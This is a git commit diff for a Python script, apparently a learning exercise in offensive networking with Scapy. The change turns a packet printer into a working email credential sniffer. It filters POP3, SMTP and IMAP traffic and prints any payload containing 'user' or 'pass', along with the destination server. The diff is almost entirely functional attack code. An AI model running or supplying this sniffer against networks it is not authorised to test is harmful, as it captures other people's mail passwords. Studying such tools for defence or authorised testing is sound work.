5dfa04a045fb5705f76a3f61ebfbc86879020f7b
Sam  Chapman <sam.chapman@outlook.com>
2021-02-15 20:51:25 +0000

    updated sniffer to perform email credential sniffing

--- owningNetworkWithScapy/mail_sniffer.py
+++ owningNetworkWithScapy/mail_sniffer.py
@@ -4,9 +4,16 @@ from scapy.all import *
 
 #packet callback
 def packet_callback(packet):
-    print(packet.show())
+    if packet[TCP].payload:
+        mail_packet = str(packet[TCP].payload)
+
+        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
+            print("[*] Server: %s" % packet[IP].dst)
+            print("[*] %s" % packet[TCP].payload)
 
 #start the sniffer
-#can add a filter="" to the sniff which allows you to set a Wireshark (BPF) style filters on packets to capture
+#filter - allows you to set Wireshark (BPF) style filters on packets to capture
 #prn - specifies callback tfunction to be called for packets that match the filter
-sniff(prn=packet_callback,count=1)
+#store - sets number of packets stored in memory. We're keeping none. 
+#count - sets the number of packets to capture. If not there default is indefinite
+sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
